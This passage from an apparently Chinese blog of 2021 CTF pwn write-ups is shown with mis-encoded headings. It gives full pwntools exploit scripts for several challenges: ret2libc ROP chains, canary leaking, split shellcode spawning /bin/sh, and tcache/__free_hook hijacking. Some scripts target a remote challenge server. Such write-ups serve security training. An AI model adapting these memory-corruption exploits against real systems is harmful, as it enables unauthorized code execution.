class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_addr = (u64(p.recv(<span class="number">8</span>))^key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(rtl_global - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>,<span class="string">b&#x27;large bin attack!!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(rtl_global+<span class="number">0x221730</span>-<span class="number">0x220060</span>+<span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(heap_addr + <span class="number">0x960</span>)</span><br><span class="line">payload += p64(set_context) + p64(ret)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x28</span> + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_rbp_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x10</span> + <span class="number">0x110</span>)*<span class="number">0x3</span></span><br><span class="line">payload += p64(<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x31C</span> - <span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">recover(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x420</span> + p64(heap_addr + <span class="number">0x960</span> + <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-é¹¤åŸæ¯-babyof"><a class="header-anchor" href="#2021-é¹¤åŸæ¯-babyof">Â¶</a>[2021 é¹¤åŸæ¯]babyof</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v5"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v5">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>ret2libc
</code></pre>
<h3 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">Â¶</a>åˆ†æ</h3>
<p>bufå¤„å­˜åœ¨æ ˆæº¢å‡º</p>
<h3 id="exp-v10"><a class="header-anchor" href="#exp-v10">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28073</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400743</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x40066B</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) +  p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-é¹¤åŸæ¯-littleof"><a class="header-anchor" href="#2021-é¹¤åŸæ¯-littleof">Â¶</a>[2021 é¹¤åŸæ¯]littleof</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v6"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v6">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>ret2libc
canary
</code></pre>
<h3 id="é¢˜ç›®åˆ†æ-v4"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v4">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>é¢˜ç›®å­˜åœ¨canary</p>
<p><img src="http://static.zybuluo.com/hgggg/bv44ppcn4yc9olz9cynvwj7p/1.jpg" alt="1.jpg-7.4kB"><br>
<img src="http://static.zybuluo.com/hgggg/qun6tu6uu3anokwgsiox0jt0/image_1fhpqrsetl1s19a1ipo1qf8s05l.png" alt="image_1fhpqrsetl1s19a1ipo1qf8s05l.png-4kB"></p>
<p>é€šè¿‡IDAåˆ†æå¯ä»¥å¾—åˆ°canaryçš„ä½ç½®åœ¨è·bufçš„0x48å¤„ï¼Œå³åªè¦padding0x48ä¸ªå­—èŠ‚å°±èƒ½å¾—åˆ°canaryå‰©ä¸‹çš„å°±æ˜¯åŸºæ“äº†</p>
<h3 id="exp-v11"><a class="header-anchor" href="#exp-v11">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;littleof&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28147</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;littleof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040059e</span></span><br><span class="line">pop_rdi =<span class="number">0x0000000000400863</span></span><br><span class="line">main = <span class="number">0x4006E2</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">canary = canary &amp; <span class="number">0XFFFFFFFFFFFFFFF0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) </span><br><span class="line">canary = canary &amp; <span class="number">0XFFFFFFFFFFFFFFF0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-ç¥¥äº‘æ¯-JigSAWâ€™sCage"><a class="header-anchor" href="#2021-ç¥¥äº‘æ¯-JigSAWâ€™sCage">Â¶</a>[2021 ç¥¥äº‘æ¯]JigSAWâ€™sCage</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v7"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v7">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.shellcode
2.æ•´æ•°æº¢å‡º
</code></pre>
<h3 id="IDA-åˆ†æ-v3"><a class="header-anchor" href="#IDA-åˆ†æ-v3">Â¶</a>IDA åˆ†æ</h3>
<p>æ¼æ´å‡½æ•°<br>
<img src="http://static.zybuluo.com/hgggg/oq0e413lm3nlmpbt5ivwjrrk/2.png" alt="2.png-53kB"></p>
<p>è™½ç„¶ç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œä½†æ˜¯æ¼æ´å‡½æ•°ä¸­å½“æ¡ä»¶æ»¡è¶³æ—¶ï¼ˆåˆ©ç”¨æ•´æ•°æº¢å‡ºï¼‰ä¼šè°ƒç”¨mprotectå‡½æ•°ä¸”protçš„å€¼ä¸º7,å³å¯¹qword_5148+1024èµ‹äºˆRWXæƒé™</p>
<p><img src="http://static.zybuluo.com/hgggg/bvqbnd4eyq3g6wlo6n6uf8nx/3.png" alt="3.png-10.8kB"><br>
è€Œqwor_5148åˆåœ¨heapå¤„ï¼Œæ•…æˆ‘ä»¬ç”³è¯·çš„å †å—å°±æœ‰ç€RWXæƒé™ï¼Œæ‰€ä»¥å¯ä»¥å‘å †å—ä¸­å†™å…¥shellcode</p>
<p>éš¾ç‚¹å°±åœ¨äºeditå‡½æ•°åªèƒ½ä¸€æ¬¡å†™å…¥0x10ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥shellcodeéœ€è¦åˆ†æ®µå†™å…¥ï¼Œåœ¨å†™å…¥çš„è¿‡ç¨‹ä¸­è¦ä¸æ–­è°ƒæ•´rsp</p>
<p>æœ€ååˆ©ç”¨ç»™å‡ºçš„testå‡½æ•°æ¥æ‰§è¡Œshellcode</p>
<h3 id="EXP-v4"><a class="header-anchor" href="#EXP-v4">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./JigSAW&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28001</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;iNput:&quot;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice :&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index? :&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">s1 = asm(<span class="string">&quot;mov rsp, rdx\nadd rsp, 0x20\npush rsp&quot;</span>)</span><br><span class="line">s2 = asm(<span class="string">&quot;mov rax, 0x68732f6e69622f\nadd rsp, 0x20\npush rsp&quot;</span>)</span><br><span class="line">s3 = asm(<span class="string">&quot;push rax\nmov rdi, rsp\nxor rsi, rsi\nadd rsp, 0x28\npush rsp&quot;</span>)</span><br><span class="line">s4 = asm(<span class="string">&quot;xor rdx, rdx\nmov rax, 59\nsyscall\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s4))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Name:&quot;</span>, <span class="string">&quot;hgg&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>, <span class="built_in">str</span>(<span class="number">0x1</span>&lt;&lt;<span class="number">32</span>))  <span class="comment">#int len overlap</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0</span>,s1)</span><br><span class="line">edit(<span class="number">1</span>, s2)</span><br><span class="line">edit(<span class="number">2</span>, s3)</span><br><span class="line">edit(<span class="number">3</span>, s4)</span><br><span class="line">test(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2021-é¹¤åŸæ¯-easyecho"><a class="header-anchor" href="#2021-é¹¤åŸæ¯-easyecho">Â¶</a>[2021 é¹¤åŸæ¯]easyecho</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v8"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v8">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>stack smashing
</code></pre>
<h3 id="è§£é¢˜æ€è·¯-v2"><a class="header-anchor" href="#è§£é¢˜æ€è·¯-v2">Â¶</a>è§£é¢˜æ€è·¯</h3>
<p>Step1:è¾“å…¥nameæ—¶æº¢å‡ºï¼Œè®¡ç®—ç¨‹åºåœ°å€</p>
<p>Step2:è¾“å…¥backdoor å°†flagè¯»åˆ°æ ˆä¸Š</p>
<p>Step3: åˆ©ç”¨gets(v10)stack smashing</p>
<p>è®¡ç®—åç§»<br>
<img src="http://static.zybuluo.com/hgggg/nyvv849arksxe3hzswduykjb/4.png" alt="4.png-382.9kB"></p>
<h3 id="EXP-v5"><a class="header-anchor" href="#EXP-v5">Â¶</a>EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=process(<span class="string">&quot;./easyecho&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Name: &quot;</span>,<span class="string">&quot;A&quot;</span>*<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome AAAAAAAAAAAAAAAA&quot;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">pie_base=leak-<span class="number">0xcf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak&quot;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">flag_addr=pie_base+<span class="number">0x202040</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;backdoor&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x168</span>+p64(flag_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;exitexit&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2021-ä¸œåæ¯-gcc2"><a class="header-anchor" href="#2021-ä¸œåæ¯-gcc2">Â¶</a>[2021 ä¸œåæ¯]gcc2</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v9"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v9">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.UAF
2.tcache bin attack
</code></pre>
<h3 id="é¢˜ç›®åˆ†æ-v5"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ-v5">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>æ¼æ´ç‚¹åœ¨freeå‡½æ•°,å­˜åœ¨UAF</p>
<p><img src="http://static.zybuluo.com/hgggg/ccgw4efnbb2aicw8r9lhzp5e/image_1fjndvfu82bh5khmn7frn1q139.png" alt="image_1fjndvfu82bh5khmn7frn1q139.png-57.7kB"></p>
<p>add å‡½æ•°é™åˆ¶äº†å †å—ç”³è¯·ä¸ªæ•°ä»¥åŠæœ€å¤§ç”³è¯·çš„å¤§å°</p>
<p><img src="http://static.zybuluo.com/hgggg/8u2ek8dyl20mhghuvbtl7cxq/image_1fjne1tamlao1plmh0sas12hbm.png" alt="image_1fjne1tamlao1plmh0sas12hbm.png-79.2kB"></p>
<p>è§£é¢˜æ€è·¯æ¯”è¾ƒç®€å•ï¼Œåˆ©ç”¨UAFæƒ³åŠæ³•æ„é€ ä¸€ä¸ªå¤§å—é‡Šæ”¾è¿‘unsorted binæ³„éœ²å‡ºlibcç„¶åæ‰“free_hook</p>
<h3 id="è§£é¢˜æ­¥éª¤-v4"><a class="header-anchor" href="#è§£é¢˜æ­¥éª¤-v4">Â¶</a>è§£é¢˜æ­¥éª¤</h3>
<p>Step1:åˆ©ç”¨UAFæ„é€ ä¸€ä¸ªå¤§äº0x410çš„å—ï¼Œé‡Šæ”¾è¿›å…¥unsorted binå¾—åˆ°libcåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  add(i, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># double free æ³„éœ²å †åœ°å€</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">10</span>, p64(heap_addr-<span class="number">0x470</span>)+p64(<span class="number">0</span>))   <span class="comment">#å°†chunk10çš„fdæŒ‡é’ˆæ”¹å†™æˆchunk0çš„åœ°å€</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(<span class="number">0</span>)+<span class="string">b&#x27;\x81\x04&#x27;</span>)         <span class="comment">#ä¿®æ”¹chunk0çš„sizeä½</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>Step2: åŠ«æŒfree_hook</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<h3 id="å®Œæ•´exp"><a class="header-anchor" href="#å®Œæ•´exp">Â¶</a>å®Œæ•´exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;gcc2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28017</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  add(i, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">10</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">edit(<span class="number">10</span>, p64(heap_addr-<span class="number">0x470</span>)+p64(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">12</span>, p64(<span class="number">0</span>)+<span class="string">b&#x27;\x81\x04&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>, drop=<span class="literal">True</span>)[-<span class="number">7</span>:- <span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">15</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-ä¸œåæ¯-cpp1"><a class="header-anchor" href="#2021-ä¸œåæ¯-cpp1">Â¶</a>[2021 ä¸œåæ¯]cpp1</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹-v10"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹-v10">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.overlapping
2.tcache bin attack
</code></pre>
